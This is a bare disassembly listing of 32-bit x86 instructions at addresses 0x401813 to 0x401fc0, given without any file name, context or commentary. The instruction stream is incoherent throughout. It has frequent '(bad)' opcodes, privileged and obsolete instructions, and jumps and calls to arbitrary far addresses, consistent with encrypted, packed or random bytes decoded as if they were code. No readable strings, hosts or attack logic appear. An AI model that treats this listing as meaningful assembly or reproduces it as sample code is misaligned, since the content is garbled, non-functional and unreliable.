  401813:	inc    esi
  401814:	stos   BYTE PTR es:[edi],al
  401815:	aad    0x7c
  401817:	int    0x1e
  401819:	or     ebp,DWORD PTR gs:[esi]
  40181c:	and    bh,BYTE PTR [ebp-0xa4a4f9a]
  401822:	inc    edx
  401823:	inc    ebp
  401824:	dec    eax
  401825:	xchg   ecx,eax
  401826:	pushf  
  401827:	cdq    
  401828:	push   eax
  401829:	xchg   DWORD PTR [edx],esi
  40182b:	out    0x75,eax
  40182d:	mov    ds:0x89e84edb,al
  401832:	mov    bh,0x2
  401834:	and    al,0x88
  401836:	cli    
  401837:	add    al,BYTE PTR [ebx]
  401839:	push   ds
  40183a:	popa   
  40183b:	into   
  40183c:	imul   edx,DWORD PTR [esi+0x67],0xffffffda
  401840:	fdivp  st(3),st
  401842:	xchg   edx,eax
  401843:	inc    ebp
  401844:	bound  edx,QWORD PTR [eax+0x351dfd85]
  40184a:	ja     0x401839
  40184c:	sbb    eax,0xb21aef55
  401851:	lods   eax,DWORD PTR ds:[esi]
  401852:	sub    esi,DWORD PTR [eax]
  401854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401855:	xchg   BYTE PTR [edi-0x16],ah
  401858:	mov    edi,0x658f2a72
  40185d:	adc    BYTE PTR [edx-0x18875868],ch
  401863:	bound  ecx,QWORD PTR [esi]
  401865:	imul   ebx,DWORD PTR [ebx],0x8ced9bd5
  40186b:	mov    edx,0x4bb9aa7
  401870:	aas    
  401871:	cmp    DWORD PTR [ebx],edi
  401873:	jg     0x40182b
  401875:	sbb    ecx,esp
  401877:	xor    ebp,DWORD PTR [ebp+0x5b]
  40187a:	popf   
  40187b:	cdq    
  40187c:	and    al,BYTE PTR [ecx+0x14edfc1]
  401882:	xchg   ecx,eax
  401883:	sub    DWORD PTR [ecx-0x62],esi
  401886:	cmp    BYTE PTR [edx+0x72a8de14],dh
  40188c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40188d:	neg    BYTE PTR [edi+0x2abc8e97]
  401893:	ja     0x4018b8
  401895:	add    al,0xa
  401897:	dec    esp
  401898:	iret   
  401899:	cmovg  esi,DWORD PTR [ebp+0x73a3864]
  4018a0:	inc    eax
  4018a1:	daa    
  4018a2:	(bad)  
  4018a3:	pop    ds
  4018a4:	sub    dh,ah
  4018a6:	test   eax,0x5db104ef
  4018ab:	jmp    0x53457b63
  4018b0:	(bad)  
  4018b2:	push   ds
  4018b3:	retf   
  4018b4:	and    ah,BYTE PTR [ecx+0x55]
  4018b7:	(bad)  
  4018b8:	(bad)  
  4018b9:	sti    
  4018ba:	out    0x2,eax
  4018bc:	push   ebx
  4018bd:	sahf   
  4018be:	scas   eax,DWORD PTR es:[edi]
  4018bf:	nop
  4018c0:	bound  esi,QWORD PTR [esi-0x4d]
  4018c3:	dec    ebx
  4018c4:	pop    edi
  4018c5:	sub    al,0x3e
  4018c7:	enter  0x4426,0x2e
  4018cb:	cmp    bh,bl
  4018cd:	dec    ebp
  4018ce:	pop    esp
  4018cf:	or     BYTE PTR [esi],ah
  4018d1:	(bad)
  4018d4:	jl     0x40186f
  4018d6:	je     0x401876
  4018d8:	popf   
  4018d9:	mov    ds:0xaeaba3de,al
  4018de:	sbb    bl,BYTE PTR [esi+0x1]
  4018e1:	call   0xad28ea13
  4018e6:	adc    ebp,DWORD PTR [eax-0x23]
  4018e9:	or     DWORD PTR [esi+0x1d2f600e],ecx
  4018ef:	jle    0x4018ee
  4018f1:	cvttps2pi mm3,QWORD PTR ds:0x53bdb18c
  4018f8:	add    DWORD PTR [ebx-0x46],edi
  4018fb:	cmc    
  4018fc:	push   ecx
  4018fd:	sbb    dl,cl
  4018ff:	lea    ecx,[edx+esi*4]
  401902:	mov    ds:0xbc294548,al
  401907:	pop    es
  401908:	add    eax,0x46c13255
  40190d:	jns    0x401974
  40190f:	shl    BYTE PTR [ebx],cl
  401911:	sub    BYTE PTR [edi],dh
  401913:	ds jl  0x40192d
  401916:	dec    ebp
  401917:	ror    esp,1
  401919:	in     al,0xfc
  40191b:	retf   
  40191c:	in     al,0x8e
  40191e:	sbb    bh,dl
  401920:	out    dx,al
  401921:	and    BYTE PTR [esi+esi*1+0x2266649f],dl
  401928:	dec    ebp
  401929:	lahf   
  40192a:	enter  0xe768,0xda
  40192e:	inc    eax
  40192f:	call   DWORD PTR [eax+0x5b]
  401932:	xlat   BYTE PTR ds:[ebx]
  401933:	xchg   ebx,eax
  401934:	sub    al,0xa7
  401936:	gs (bad) 
  401938:	mov    edx,0xa5a8f9b4
  40193d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40193e:	add    ch,BYTE PTR [ebx-0x206797bb]
  401944:	mov    bl,0x48
  401946:	and    ebp,DWORD PTR [eax]
  401948:	(bad)  
  401949:	add    BYTE PTR [eax+0x3ab7ea9d],bl
  40194f:	xchg   esi,eax
  401950:	arpl   WORD PTR [edi-0x4c20c537],ax
  401956:	jecxz  0x401924
  401958:	shl    DWORD PTR [eax-0x59],cl
  40195b:	gs std 
  40195d:	mov    eax,0xeb6a291a
  401962:	leave  
  401963:	hlt    
  401964:	rcl    dh,1
  401966:	add    eax,0x3ccdae8f
  40196b:	jge    0x4019b2
  40196d:	mov    cl,0xc
  40196f:	inc    edx
  401970:	sahf   
  401971:	or     esp,DWORD PTR [ebx+0x49]
  401974:	or     eax,0x4dae6ece
  401979:	lea    ebx,[ecx]
  40197b:	pop    es
  40197c:	imul   eax,ecx,0xffffffa0
  40197f:	popa   
  401980:	sub    BYTE PTR [ecx],bl
  401982:	push   esp
  401983:	cli    
  401984:	inc    esi
  401985:	stc    
  401986:	(bad)  
  401987:	xor    BYTE PTR [edi-0x408a2b],dl
  40198d:	add    ch,0x5
  401990:	cmp    DWORD PTR [edi-0x48ec0352],ecx
  401996:	stos   BYTE PTR es:[edi],al
  401997:	sub    eax,0x97cd948d
  40199c:	loop   0x4019a6
  40199e:	imul   ebx,esi,0x61c61c20
  4019a4:	sahf   
  4019a5:	dec    esi
  4019a6:	and    BYTE PTR [eax-0x3c5393fc],dl
  4019ac:	icebp  
  4019ad:	mov    ds:0xabd36e3b,eax
  4019b2:	shl    ch,cl
  4019b4:	push   eax
  4019b5:	jo     0x4019fd
  4019b7:	das    
  4019b8:	add    eax,0x20dfb689
  4019bd:	cld    
  4019be:	imul   ebp,DWORD PTR [esi],0x45
  4019c1:	dec    ecx
  4019c2:	leave  
  4019c3:	das    
  4019c4:	adc    eax,0xbdf98fe1
  4019c9:	mov    bh,0xcd
  4019cb:	pop    esi
  4019cc:	sbb    eax,0x2d5cb582
  4019d1:	iret   
  4019d2:	jge    0x401a26
  4019d4:	enter  0x2c77,0xec
  4019d8:	frstpm(287 only) 
  4019da:	icebp  
  4019db:	jecxz  0x401a49
  4019dd:	mov    bl,cl
  4019df:	lds    edi,FWORD PTR [ebx+ebx*4-0x61d4faf7]
  4019e6:	jle    0x4019a9
  4019e8:	in     eax,0x19
  4019ea:	leave  
  4019eb:	jp     0x401999
  4019ed:	mov    ecx,0x7202eaa6
  4019f2:	in     eax,0x17
  4019f4:	icebp  
  4019f5:	mov    bh,0x7a
  4019f7:	push   ecx
  4019f8:	pop    es
  4019f9:	xor    al,0xc
  4019fb:	(bad)  
  4019fc:	je     0x4019da
  4019fe:	fst    QWORD PTR [edx-0x17a7bf5e]
  401a04:	push   esi
  401a05:	in     eax,0xe7
  401a07:	fild   DWORD PTR [edx-0x39ab1dd8]
  401a0d:	scas   eax,DWORD PTR es:[edi]
  401a0e:	sbb    dh,BYTE PTR [ebx]
  401a10:	jge    0x401a2c
  401a12:	dec    edx
  401a13:	rep ins DWORD PTR es:[edi],dx
  401a15:	cmp    ch,cl
  401a17:	jnp    0x401a1d
  401a19:	sub    ah,BYTE PTR [ebx+0x42dcc0cd]
  401a1f:	inc    ebx
  401a20:	fdiv   st,st(0)
  401a22:	xchg   esi,eax
  401a23:	pusha  
  401a24:	fnsave [ebp+0xb]
  401a27:	in     al,dx
  401a28:	sahf   
  401a29:	or     bh,BYTE PTR ds:0x9a79f23d
  401a2f:	in     al,0xc4
  401a31:	test   eax,0x9b7601ad
  401a36:	inc    esp
  401a37:	lds    eax,FWORD PTR [eax-0x5474f7b4]
  401a3d:	jno    0x401a7f
  401a3f:	mov    ds:0xe5bd443e,eax
  401a44:	je     0x4019d8
  401a46:	jmp    0x4019c9
  401a48:	ds repnz mov al,0xa2
  401a4c:	ds cld 
  401a4e:	pop    ebx
  401a50:	fadd   DWORD PTR [edx+0x7c688364]
  401a56:	leave  
  401a57:	and    DWORD PTR [edi],edx
  401a59:	scas   eax,DWORD PTR es:[edi]
  401a5a:	cdq    
  401a5b:	int    0x7a
  401a5d:	ficomp DWORD PTR [edi-0x71f9eb82]
  401a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a64:	or     dh,BYTE PTR [ebx]
  401a66:	repz add al,0xe2
  401a69:	gs data16 jnp 0x401a0e
  401a6d:	fs in  al,0xb1
  401a70:	icebp  
  401a71:	data16 adc BYTE PTR [esi-0x4b],al
  401a75:	ins    BYTE PTR es:[edi],dx
  401a76:	inc    eax
  401a77:	in     al,0x2c
  401a79:	sbb    eax,DWORD PTR [ecx-0x7bd2813c]
  401a7f:	iret   
  401a80:	pop    ecx
  401a81:	retf   0x6d07
  401a84:	mov    dl,0xf1
  401a86:	mov    ah,0x81
  401a88:	pop    es
  401a89:	shl    BYTE PTR ds:0x4703fbf5,1
  401a8f:	psubsb mm7,mm2
  401a92:	ja     0x401a64
  401a94:	in     al,0xd0
  401a96:	nop
  401a97:	xor    esp,DWORD PTR [ebx-0x35a0535]
  401a9d:	mov    es,WORD PTR [ebx-0x34]
  401aa0:	out    dx,al
  401aa1:	pop    ds
  401aa2:	and    ecx,ebp
  401aa4:	sub    al,0x2f
  401aa6:	adc    al,0xb6
  401aa8:	sahf   
  401aa9:	retf   0x96e2
  401aac:	and    al,0xc6
  401aae:	mov    esi,0x838422b6
  401ab3:	xchg   ebp,eax
  401ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ab5:	cdq    
  401ab6:	mov    ch,0x81
  401ab8:	fisttp QWORD PTR [edi]
  401aba:	shl    BYTE PTR [ebx-0x78e9c8a],1
  401ac0:	hlt    
  401ac1:	mov    al,0xa0
  401ac3:	imul   ecx,ecx,0x61646438
  401ac9:	scas   eax,DWORD PTR es:[edi]
  401aca:	jo     0x401a50
  401acc:	jge    0x401b32
  401ace:	cmp    esp,DWORD PTR [esi+0x7eacf94c]
  401ad4:	std    
  401ad5:	sub    BYTE PTR [esi],dl
  401ad7:	in     eax,0xf1
  401ad9:	or     bl,BYTE PTR [eax]
  401adb:	pop    esi
  401adc:	outs   dx,DWORD PTR ds:[esi]
  401add:	stc    
  401ade:	cmp    esp,esi
  401ae0:	jmp    0x6dd1:0x949a31cf
  401ae7:	ss pop ds
  401ae9:	or     esp,esi
  401aeb:	aaa    
  401aec:	aad    0xf2
  401aee:	xchg   DWORD PTR [ecx-0x3c],esi
  401af1:	xor    BYTE PTR [eax+0x25],dl
  401af4:	adc    BYTE PTR [ebp-0xd],0xbf
  401af8:	fldcw  WORD PTR [edx-0x2dd1084b]
  401afe:	mov    edx,0xe1f23220
  401b03:	scas   eax,DWORD PTR es:[edi]
  401b04:	and    edi,0x9876eebb
  401b0a:	sbb    eax,0x193f476b
  401b0f:	xchg   edi,eax
  401b10:	call   0x8dd772c7
  401b15:	jmp    0x2b1:0x178c3436
  401b1c:	cmp    DWORD PTR [edi],0xe005923
  401b22:	mov    ds:0xd353cddb,al
  401b27:	ja     0x401b62
  401b29:	inc    eax
  401b2a:	push   es
  401b2b:	xchg   ecx,eax
  401b2c:	int    0x97
  401b2e:	adc    bh,ch
  401b30:	xor    DWORD PTR [ebx+0xcbadcf1],ebp
  401b36:	pop    ecx
  401b37:	xor    al,0xd4
  401b39:	cmp    bl,BYTE PTR [bx+si-0x7f81]
  401b3e:	dec    esp
  401b3f:	xor    eax,0xffffff85
  401b42:	mov    eax,0xf8a80bff
  401b47:	ins    DWORD PTR es:[edi],dx
  401b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b49:	fst    DWORD PTR [ebp+0x3a]
  401b4c:	xchg   ebx,eax
  401b4d:	out    0xf1,eax
  401b4f:	test   DWORD PTR [ecx+0x40a0da35],edi
  401b55:	sahf   
  401b56:	pop    DWORD PTR ds:0x97289fa8
  401b5c:	ret    0x1054
  401b5f:	jp     0x401b5d
  401b61:	push   esp
  401b62:	mov    DWORD PTR [eax+0x64],esi
  401b65:	lods   al,BYTE PTR ds:[esi]
  401b66:	in     eax,0xcf
  401b68:	xlat   BYTE PTR ds:[ebx]
  401b69:	or     DWORD PTR [eax],ebx
  401b6b:	sub    BYTE PTR [ebp+ebp*4-0x2b2b8d64],dh
  401b72:	or     edx,ecx
  401b74:	pop    ebp
  401b75:	shl    esi,0x9c
  401b78:	loop   0x401b48
  401b7a:	fxam   
  401b7c:	outs   dx,DWORD PTR ds:[esi]
  401b7d:	mov    es,esp
  401b7f:	adc    esp,esi
  401b81:	in     al,0x36
  401b83:	repnz xchg esp,eax
  401b85:	cmp    eax,0x24cb178d
  401b8a:	mov    esp,DWORD PTR [ecx]
  401b8c:	pop    esp
  401b8d:	mov    es,WORD PTR [edi+ebx*2+0x9]
  401b91:	shl    BYTE PTR [esi],cl
  401b93:	sub    DWORD PTR [eax],ecx
  401b95:	int    0xcf
  401b97:	mov    esi,0x8d63340f
  401b9c:	enter  0xdb23,0xf6
  401ba0:	mov    esi,0x9130ded4
  401ba5:	and    bl,BYTE PTR [ecx+0x49]
  401ba8:	sub    eax,0x7042d272
  401bad:	cli    
  401bae:	or     dh,BYTE PTR [ebp-0x1967bdf3]
  401bb4:	cmp    edi,edx
  401bb6:	rol    DWORD PTR [eax+edi*8],0xaa
  401bba:	jecxz  0x401bf2
  401bbc:	add    BYTE PTR [eax],bh
  401bbe:	or     DWORD PTR [ebx-0x534898fb],ecx
  401bc4:	cli    
  401bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bc6:	inc    esp
  401bc7:	xchg   ebp,eax
  401bc8:	ret    0xbdb8
  401bcb:	add    ecx,DWORD PTR [ecx-0x3a]
  401bce:	xor    eax,0xf19eb4f5
  401bd3:	sub    al,0x2d
  401bd5:	mov    ebx,0x3b0bae0f
  401bda:	pop    ecx
  401bdb:	test   BYTE PTR [esi+0x321ad5c4],bh
  401be1:	mov    ebx,0xbb25d2f2
  401be6:	pop    es
  401be7:	dec    ecx
  401be8:	inc    esi
  401be9:	push   esi
  401bea:	adc    eax,0x6ab7548
  401bef:	sahf   
  401bf0:	ficomp WORD PTR [esi]
  401bf2:	push   0xcdc71d3f
  401bf7:	xchg   ecx,eax
  401bf8:	inc    ebx
  401bf9:	shl    BYTE PTR [ebp-0x51],0xf2
  401bfd:	adc    al,0xd2
  401bff:	mov    WORD PTR [ecx-0x28b1859c],?
  401c05:	(bad)  
  401c06:	lds    ecx,FWORD PTR [ecx]
  401c08:	mov    WORD PTR [ebx-0x3769f49],ds
  401c0e:	sbb    edx,ebx
  401c10:	ins    BYTE PTR es:[edi],dx
  401c11:	mov    ecx,0x5452db89
  401c16:	push   cs
  401c17:	shl    dl,0x68
  401c1a:	xchg   eax,edi
  401c1c:	mov    ds:0x3b7ebf5e,al
  401c21:	loope  0x401c5e
  401c23:	ret    0x78d4
  401c26:	mov    ecx,0xc3f17f4d
  401c2b:	aam    0x78
  401c2d:	loope  0x401c35
  401c2f:	test   eax,0xb6db246d
  401c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c35:	(bad)  
  401c36:	pop    eax
  401c37:	inc    edi
  401c38:	mov    ss,WORD PTR ds:0x6ac3c053
  401c3e:	jno    0x162007ec
  401c44:	fldcw  WORD PTR [esi+0x1910ef6b]
  401c4a:	xor    ah,BYTE PTR [esi+0x5f]
  401c4d:	in     al,dx
  401c4e:	fist   WORD PTR [esi]
  401c50:	in     al,0x44
  401c52:	mov    ds:0x6537a9b6,eax
  401c57:	inc    edx
  401c58:	std    
  401c59:	xchg   ecx,eax
  401c5a:	shl    ah,cl
  401c5c:	push   esp
  401c5d:	int    0x90
  401c5f:	xchg   ebx,eax
  401c61:	jbe    0x401c98
  401c63:	je     0x401cdd
  401c65:	jle    0x401c06
  401c67:	addr16 or eax,0xf4a89551
  401c6d:	shl    BYTE PTR [eax+0x6e],1
  401c70:	repz push eax
  401c72:	xchg   ebp,eax
  401c73:	jbe    0x401cd1
  401c75:	mov    eax,ds:0xb40a8a4f
  401c7a:	jns    0x401c6e
  401c7c:	sub    BYTE PTR [ebp-0x4c],bl
  401c7f:	xchg   esi,eax
  401c80:	adc    eax,0xf5cd1db4
  401c85:	push   edi
  401c86:	xchg   ecx,eax
  401c87:	repz out dx,eax
  401c89:	pop    ds
  401c8a:	push   ds
  401c8b:	lea    edi,[edx-0x4]
  401c8e:	pop    eax
  401c8f:	pop    es
  401c90:	pop    ebp
  401c91:	out    dx,al
  401c92:	cmp    DWORD PTR [ebx+0x79596030],0x689285b6
  401c9c:	jae    0x401c6a
  401c9e:	std    
  401c9f:	or     ebp,DWORD PTR [edx+ebx*8]
  401ca2:	and    ecx,0xffffffab
  401ca5:	fidiv  DWORD PTR ds:0x103f5bce
  401cab:	sbb    edi,DWORD PTR [ecx-0x622a24a2]
  401cb1:	fs mov al,0x15
  401cb4:	dec    ecx
  401cb5:	dec    esi
  401cb6:	rol    DWORD PTR [eax],0x15
  401cb9:	inc    edx
  401cba:	lds    eax,FWORD PTR ss:[edx]
  401cbd:	aaa    
  401cbe:	rcl    DWORD PTR gs:[ecx],0xc3
  401cc2:	pop    esp
  401cc3:	mov    ecx,0x3de0adb0
  401cc8:	popf   
  401cc9:	scas   al,BYTE PTR es:[edi]
  401cca:	ret    
  401ccb:	ror    DWORD PTR [esi-0x392be015],0x67
  401cd2:	mov    esi,0xc7014f1a
  401cd7:	mov    ebp,0xeab7459c
  401cdc:	xor    cl,al
  401cde:	stos   BYTE PTR es:[edi],al
  401cdf:	inc    esp
  401ce0:	mov    ds:0xf4663078,eax
  401ce5:	xchg   BYTE PTR [ecx+0x1bb2785d],bh
  401ceb:	mov    al,0x79
  401ced:	dec    edi
  401cee:	jle    0x401d5f
  401cf0:	add    esi,DWORD PTR [eax]
  401cf2:	ins    DWORD PTR es:[edi],dx
  401cf3:	rcr    DWORD PTR [ebx],cl
  401cf5:	stos   DWORD PTR es:[edi],eax
  401cf6:	or     ah,al
  401cf8:	and    eax,0x7a0aef5a
  401cfd:	mov    ds:0x86588208,al
  401d02:	or     bh,bh
  401d04:	mov    ds:0xdaf4952f,eax
  401d09:	pop    ds
  401d0a:	mov    al,ds:0xbc6de4fd
  401d0f:	or     bl,al
  401d11:	xor    al,0xff
  401d13:	dec    esi
  401d14:	stos   BYTE PTR es:[edi],al
  401d15:	stc    
  401d16:	jnp    0x401d5c
  401d18:	xor    al,0xc2
  401d1a:	push   eax
  401d1b:	nop
  401d1c:	mov    bl,0x72
  401d1e:	inc    esp
  401d1f:	out    dx,al
  401d20:	dec    esp
  401d21:	ins    BYTE PTR es:[edi],dx
  401d22:	dec    esp
  401d23:	push   0x68
  401d25:	xor    dh,BYTE PTR [edi-0x3f]
  401d28:	lahf   
  401d29:	mov    DWORD PTR [ebx+0x51b864e0],0xdee8c681
  401d33:	mov    eax,ds:0xd460e2d7
  401d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d39:	aas    
  401d3a:	leave  
  401d3b:	fist   WORD PTR [esi]
  401d3d:	in     eax,0xa4
  401d3f:	stos   DWORD PTR es:[edi],eax
  401d40:	int    0xa7
  401d42:	jne    0x401d19
  401d44:	jbe    0x401d44
  401d46:	inc    edi
  401d47:	stos   BYTE PTR es:[edi],al
  401d48:	mov    DWORD PTR [ebp+0x7e],ebx
  401d4b:	mov    ebx,DWORD PTR [ecx+0x20]
  401d4e:	aas    
  401d4f:	sub    al,0xa
  401d51:	add    al,BYTE PTR [esi]
  401d53:	repz adc edi,DWORD PTR [eax]
  401d56:	vmaxpd ymm6,ymm0,YMMWORD PTR [edi+0x33]
  401d5b:	mov    eax,0x5cfe6523
  401d60:	punpckhdq mm0,QWORD PTR [edi-0x51736dfc]
  401d67:	cli    
  401d68:	jmp    0xddc9ca7
  401d6d:	ror    DWORD PTR [esi-0x66a013f3],0x8a
  401d74:	jmp    0xc14d:0xbcffdc46
  401d7b:	hlt    
  401d7c:	lods   al,BYTE PTR ds:[esi]
  401d7d:	push   eax
  401d7e:	enter  0x76bf,0xca
  401d82:	mov    eax,DWORD PTR [ebp-0x4c]
  401d85:	mov    ?,edx
  401d87:	dec    eax
  401d88:	pop    ss
  401d89:	dec    ecx
  401d8a:	outs   dx,DWORD PTR ds:[esi]
  401d8b:	mov    al,ds:0x5c805f99
  401d90:	push   ds
  401d91:	xchg   ebp,eax
  401d92:	sbb    DWORD PTR [ebp+eax*1-0x4da920b4],edx
  401d99:	mov    WORD PTR [ebp+0x29826334],ss
  401d9f:	pusha  
  401da0:	cmp    BYTE PTR [ecx+0x37b0d87],al
  401da6:	pop    ss
  401da7:	lods   eax,DWORD PTR fs:[esi]
  401da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401daa:	inc    eax
  401dab:	fst    QWORD PTR [esi-0x593857ea]
  401db1:	call   0xa686:0x151cfa2a
  401db8:	dec    ecx
  401db9:	mov    esp,0xfe1413b1
  401dbe:	test   DWORD PTR [esi-0x626519ea],0xc861da15
  401dc8:	sub    esi,DWORD PTR [ebx]
  401dca:	mov    DWORD PTR [edi],esi
  401dcc:	call   0x53f72ff1
  401dd1:	or     BYTE PTR cs:[edi+0x6a],bh
  401dd5:	sbb    DWORD PTR [edi],ebp
  401dd7:	adc    BYTE PTR [ecx-0x6a47effa],0x31
  401dde:	and    BYTE PTR [edi],ch
  401de0:	mov    ebp,0xeb1ed042
  401de5:	rol    DWORD PTR [ebp+0xd],1
  401de8:	push   ss
  401de9:	mov    DWORD PTR [ebp+0xa],esp
  401dec:	dec    ebp
  401ded:	jg     0x401d8f
  401def:	push   esp
  401df0:	shr    DWORD PTR [edx-0x5d91c491],0xb7
  401df7:	xor    ebx,DWORD PTR [ebp+0x4]
  401dfa:	mov    cl,0xac
  401dfc:	and    esp,DWORD PTR [esi+eiz*1]
  401dff:	xchg   ecx,eax
  401e00:	stos   BYTE PTR es:[edi],al
  401e01:	retf   
  401e02:	out    dx,al
  401e03:	clc    
  401e04:	mov    al,0x7d
  401e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e07:	mov    dl,0x2b
  401e09:	aas    
  401e0a:	faddp  st(1),st
  401e0c:	popf   
  401e0d:	ror    BYTE PTR [ebx+0x2e8a587f],cl
  401e13:	sar    edi,1
  401e15:	test   DWORD PTR [edx+ebx*4+0x27fecc31],0x4880a316
  401e20:	mov    ebx,0x41646880
  401e25:	mov    al,ds:0x5e9099e8
  401e2a:	xor    eax,0x48482fce
  401e2f:	fild   QWORD PTR [edi-0x4e6582c6]
  401e35:	pop    DWORD PTR [ebp+0x5a]
  401e38:	retf   
  401e39:	mov    cl,0x3c
  401e3b:	loop   0x401e3a
  401e3d:	ja     0x401e6a
  401e3f:	cmovge ebx,DWORD PTR ds:0x28e5423a
  401e47:	add    al,0x6f
  401e49:	xlat   BYTE PTR ds:[ebx]
  401e4a:	xor    ebx,esp
  401e4c:	aaa    
  401e4d:	cmp    al,0x92
  401e4f:	and    edi,DWORD PTR [eax+0x5a]
  401e52:	aam    0xab
  401e54:	bound  ecx,QWORD PTR [ecx-0x4b]
  401e57:	stos   DWORD PTR es:[edi],eax
  401e58:	dec    edx
  401e59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e5a:	sub    DWORD PTR [ebx-0x44],ebx
  401e5d:	(bad)  
  401e5e:	in     al,0x47
  401e60:	dec    esi
  401e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e62:	sub    al,0x2b
  401e64:	repnz out 0xca,al
  401e67:	ret    0x2239
  401e6a:	xchg   ecx,eax
  401e6b:	aaa    
  401e6c:	fst    QWORD PTR [ebp-0x2f6bd1f7]
  401e72:	(bad)  
  401e74:	jmp    0x496db437
  401e79:	dec    esp
  401e7a:	xchg   edi,eax
  401e7b:	mov    BYTE PTR [eax],bl
  401e7d:	sti    
  401e7e:	sub    dh,0x20
  401e81:	stos   BYTE PTR es:[edi],al
  401e82:	jmp    0x401e0a
  401e84:	stos   BYTE PTR es:[edi],al
  401e85:	mov    cl,0x98
  401e87:	push   ecx
  401e88:	pop    ebp
  401e89:	imul   edx,esp,0xffffffb4
  401e8c:	xchg   edx,eax
  401e8d:	mov    WORD PTR [esi+0x5225a492],ds
  401e93:	imul   ebp,DWORD PTR [ebx-0x79],0x3f
  401e97:	mov    dl,0x49
  401e99:	pop    ss
  401e9a:	nop
  401e9b:	push   ss
  401e9c:	pop    esp
  401e9d:	call   0x401c69e2
  401ea2:	sub    DWORD PTR [edi+0x4a2027e8],edi
  401ea8:	mov    cs,WORD PTR [ecx]
  401eaa:	arpl   sp,cx
  401eac:	int3   
  401ead:	jp     0x401ee7
  401eaf:	mov    bh,0x16
  401eb1:	cmp    edi,ecx
  401eb3:	arpl   WORD PTR [ebx+0x2fceda31],sp
  401eb9:	cs popa 
  401ebb:	(bad)  
  401ebc:	leave  
  401ebd:	fldcw  WORD PTR [edx-0x73603e7]
  401ec3:	rcr    bl,cl
  401ec5:	outs   dx,DWORD PTR ds:[esi]
  401ec6:	aam    0xe4
  401ec8:	stos   BYTE PTR es:[edi],al
  401ec9:	add    bl,BYTE PTR [ebx]
  401ecb:	jge    0x401f0b
  401ecd:	pop    ecx
  401ece:	gs ds adc eax,0x48137834
  401ed5:	shl    BYTE PTR [eax],1
  401ed7:	inc    ecx
  401ed8:	jno    0x401e6c
  401eda:	or     eax,0xcb4b3f14
  401edf:	int    0x98
  401ee1:	std    
  401ee2:	mov    al,ds:0x5104e11b
  401ee7:	pop    edi
  401ee8:	push   ss
  401ee9:	in     eax,dx
  401eea:	pop    eax
  401eeb:	outs   dx,DWORD PTR ds:[esi]
  401eec:	cmp    DWORD PTR [edx-0x24],edi
  401eef:	sbb    bl,cl
  401ef1:	aas    
  401ef2:	imul   esp,esi,0x779968ab
  401ef8:	mov    esi,0x5a15834c
  401efd:	bound  edi,QWORD PTR [eax+0x1b732e7]
  401f03:	hlt    
  401f04:	daa    
  401f05:	retf   0x45fc
  401f08:	jae    0x401f83
  401f0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f0b:	xchg   ebp,eax
  401f0c:	loope  0x401ec7
  401f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f0f:	loope  0x401f3e
  401f11:	aaa    
  401f12:	mov    ah,0x2d
  401f14:	xor    ah,BYTE PTR [esi]
  401f16:	lock mov ecx,0xb7b1b290
  401f1c:	cdq    
  401f1d:	leave  
  401f1e:	pop    edi
  401f1f:	ret    
  401f20:	mov    ds:0x26689bad,eax
  401f25:	xor    BYTE PTR [eax+0x62],ch
  401f28:	imul   ecx,DWORD PTR [edx+0x31],0x53
  401f2c:	fisubr DWORD PTR [edi]
  401f2e:	mov    edx,0xaca597e3
  401f33:	and    BYTE PTR [esi-0x69361c9d],cl
  401f39:	push   ebx
  401f3a:	loopne 0x401f3e
  401f3c:	lods   al,BYTE PTR ds:[esi]
  401f3d:	sub    ecx,DWORD PTR [eax+0x54108bda]
  401f43:	cmp    BYTE PTR [esi+0x2f164880],ch
  401f49:	ds mov ch,0x60
  401f4c:	mov    bh,0xbb
  401f4e:	fucomp st(2)
  401f50:	xor    al,0xdd
  401f52:	push   esp
  401f53:	ja     0x401fcf
  401f55:	add    eax,0x12cfa766
  401f5a:	add    edx,DWORD PTR [eax+0x5be6850b]
  401f60:	aam    0x75
  401f62:	add    eax,0x739f88f6
  401f67:	dec    ebx
  401f68:	int3   
  401f69:	bound  ebp,QWORD PTR [eax-0x8]
  401f6c:	fisttp DWORD PTR [esp+esi*4+0x59]
  401f70:	cmp    edi,eax
  401f72:	lea    ebp,[eax-0x3b]
  401f75:	jmp    0x401fde
  401f77:	xchg   esi,eax
  401f78:	xchg   ecx,eax
  401f79:	dec    edi
  401f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f7b:	cmp    al,0x9e
  401f7d:	xor    eax,DWORD PTR [ebp-0xa]
  401f80:	in     al,dx
  401f81:	xor    al,0x8c
  401f83:	(bad)  
  401f84:	retf   
  401f85:	mov    ecx,0xca48e94d
  401f8a:	jns    0x401fe8
  401f8c:	pop    esp
  401f8d:	mov    dh,0x56
  401f8f:	test   DWORD PTR [ebx+ebp*2-0x14],ebp
  401f93:	pop    ecx
  401f94:	push   0x18
  401f96:	popa   
  401f97:	(bad)  
  401f98:	pop    esi
  401f99:	shl    ch,cl
  401f9b:	pop    eax
  401f9c:	mov    eax,0x654c7fac
  401fa1:	pop    edi
  401fa2:	aaa    
  401fa3:	scas   al,BYTE PTR es:[edi]
  401fa4:	pop    ebp
  401fa5:	cmp    BYTE PTR [edx],bh
  401fa7:	mov    ah,0xcb
  401fa9:	jae    0x401f6c
  401fab:	pushf  
  401fac:	loopne 0x401f5b
  401fae:	xor    DWORD PTR [edi+0x7a9c3da5],0x26
  401fb5:	hlt    
  401fb6:	xchg   esp,eax
  401fb7:	jp     0x402028
  401fb9:	ins    BYTE PTR es:[edi],dx
  401fba:	mov    ebp,0x3818e8f
  401fbf:	das    
  401fc0:	aas    
